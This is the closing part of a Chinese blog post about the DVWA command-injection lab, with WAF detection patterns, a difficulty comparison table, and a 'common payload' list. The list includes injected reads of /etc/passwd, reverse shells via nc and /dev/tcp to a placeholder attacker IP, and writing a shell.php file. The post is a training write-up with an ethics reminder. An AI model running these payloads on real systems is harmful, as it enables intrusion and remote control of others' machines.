+<h3 id="检测和监控"><a href="#检测和监控" class="headerlink" title="检测和监控"></a>检测和监控</h3><ol>
+<li><p><strong>WAF规则</strong></p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">检测模式：</span><br><span class="line">[;&amp;|]</span><br><span class="line">$(...)</span><br><span class="line"><span class="string">`...`</span></span><br><span class="line">%0A（换行符）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>日志监控</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录所有命令执行</span></span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;Command executed: &quot;</span> . <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Low</th>
+<th>Medium</th>
+<th>High</th>
+<th>Impossible</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>输入验证</td>
+<td>❌</td>
+<td>黑名单（2个）</td>
+<td>黑名单（9个）</td>
+<td>✅ 白名单</td>
+</tr>
+<tr>
+<td>过滤字符</td>
+<td>无</td>
+<td>&amp;&amp;, ;</td>
+<td>&amp;, ;, | , -, $, (, ), &#96;, ||</td>
+<td>N&#x2F;A</td>
+</tr>
+<tr>
+<td>验证方式</td>
+<td>无</td>
+<td>简单替换</td>
+<td>扩展替换</td>
+<td>IP格式验证</td>
+</tr>
+<tr>
+<td>CSRF防护</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>可绕过性</td>
+<td>完全开放</td>
+<td>容易</td>
+<td>中等</td>
+<td>几乎不可能</td>
+</tr>
+<tr>
+<td>攻击示例</td>
+<td><code>; ls</code></td>
+<td><code>| ls</code></td>
+<td><code>|ls</code>（无空格）</td>
+<td>无法注入</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>学习路径：</strong></p>
+<ol>
+<li><strong>Low难度</strong> - 理解基本的命令注入</li>
+<li><strong>Medium难度</strong> - 学习绕过简单黑名单</li>
+<li><strong>High难度</strong> - 掌握高级绕过技巧</li>
+<li><strong>Impossible难度</strong> - 理解正确的防御方法</li>
+</ol>
+<p><strong>常用Payload集合：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础测试</span></span><br><span class="line">; <span class="built_in">whoami</span></span><br><span class="line">&amp; <span class="built_in">whoami</span></span><br><span class="line">| <span class="built_in">whoami</span></span><br><span class="line">|| <span class="built_in">whoami</span></span><br><span class="line">&amp;&amp; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件</span></span><br><span class="line">; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">| <span class="built_in">cat</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列目录</span></span><br><span class="line">; <span class="built_in">ls</span> -la</span><br><span class="line">; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">; nc -e /bin/bash 攻击者IP 端口</span><br><span class="line">; bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写文件</span></span><br><span class="line">; <span class="built_in">echo</span> <span class="string">&quot;恶意代码&quot;</span> &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>工具推荐：</strong></p>
+<ul>
+<li>Burp Suite - 拦截修改请求</li>
+<li>Commix - 自动化命令注入工具</li>
+<li>SQLMap的os-shell模式</li>
+</ul>
+<p><strong>道德准则：</strong></p>
+<ul>
+<li>只在授权环境测试</li>
+<li>不攻击真实系统</li>
+<li>理解防御才能更好地防护</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>点这里请我吃个小蛋糕吧～～</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="caixuya WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="caixuya Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>caixuya
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://caixuya.github.io/2025/11/20/Command_Injection_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" title="DVWA - Command Injection (命令注入) 攻防练习详解">http://caixuya.github.io/2025/11/20/Command_Injection_攻防练习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/19/%E8%A7%A3%E5%86%B3Burp_Suite%E6%97%A0%E6%B3%95%E6%8B%A6%E6%88%AAlocalhost%E8%AF%B7%E6%B1%82%E9%97%AE%E9%A2%98/" rel="prev" title="解决 Burp Suite 无法拦截 localhost 请求的问题">
+      <i class="fa fa-chevron-left"></i> 解决 Burp Suite 无法拦截 localhost 请求的问题
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/20/Cryptography_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="next" title="DVWA - Cryptography (密码学) 攻防练习详解">
+      DVWA - Cryptography (密码学) 攻防练习详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88Command-Injection%EF%BC%89%EF%BC%9F"><span class="nav-number">2.1.</span> <span class="nav-text">什么是命令注入（Command Injection）？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low-%E9%9A%BE%E5%BA%A6"><span class="nav-number">3.</span> <span class="nav-text">Low 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="nav-number">3.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.4.</span> <span class="nav-text">攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%B5%8B%E8%AF%95"><span class="nav-number">3.4.1.</span> <span class="nav-text">基础测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AB%98%E7%BA%A7%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.2.</span> <span class="nav-text">高级攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Burp-Suite"><span class="nav-number">3.4.3.</span> <span class="nav-text">使用Burp Suite</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium-%E9%9A%BE%E5%BA%A6"><span class="nav-number">4.</span> <span class="nav-text">Medium 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-1"><span class="nav-number">4.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">4.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4"><span class="nav-number">4.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="nav-number">4.5.1.</span> <span class="nav-text">方法1：使用其他连接符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E5%9C%A8Burp-Suite%E4%B8%AD%E6%B5%8B%E8%AF%95"><span class="nav-number">4.5.2.</span> <span class="nav-text">方法2：在Burp Suite中测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">4.5.3.</span> <span class="nav-text">方法3：其他绕过技巧</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High-%E9%9A%BE%E5%BA%A6"><span class="nav-number">5.</span> <span class="nav-text">High 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-2"><span class="nav-number">5.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">5.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4-1"><span class="nav-number">5.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">5.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-number">5.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E7%AE%A1%E9%81%93%E7%AC%A6%E4%B8%8D%E5%8A%A0%E7%A9%BA%E6%A0%BC"><span class="nav-number">5.5.1.</span> <span class="nav-text">方法1：管道符不加空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E4%BD%BF%E7%94%A8%E6%8D%A2%E8%A1%8C%E7%AC%A6"><span class="nav-number">5.5.2.</span> <span class="nav-text">方法2：使用换行符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E7%BB%84%E5%90%88%E7%BB%95%E8%BF%87"><span class="nav-number">5.5.3.</span> <span class="nav-text">方法3：组合绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible-%E9%9A%BE%E5%BA%A6"><span class="nav-number">6.</span> <span class="nav-text">Impossible 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-3"><span class="nav-number">6.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">6.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E7%9A%84%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">6.3.</span> <span class="nav-text">完善的防护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%97%A0%E6%B3%95%E6%94%BB%E7%A0%B4%EF%BC%9F"><span class="nav-number">6.4.</span> <span class="nav-text">为什么无法攻破？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="nav-number">7.1.</span> <span class="nav-text">代码层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="nav-number">7.2.</span> <span class="nav-text">函数说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E5%B1%82%E9%9D%A2"><span class="nav-number">7.3.</span> <span class="nav-text">架构层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%92%8C%E7%9B%91%E6%8E%A7"><span class="nav-number">7.4.</span> <span class="nav-text">检测和监控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94"><span class="nav-number">8.</span> <span class="nav-text">总结对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">实战建议</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="caixuya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">caixuya</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Caixuya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Caixuya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:214089030@qq.com" title="E-Mail → mailto:214089030@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备20064368号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caixuya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">374k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">5:40</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/undefined/anime.min.js"></script>
+  <script src="/undefined/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
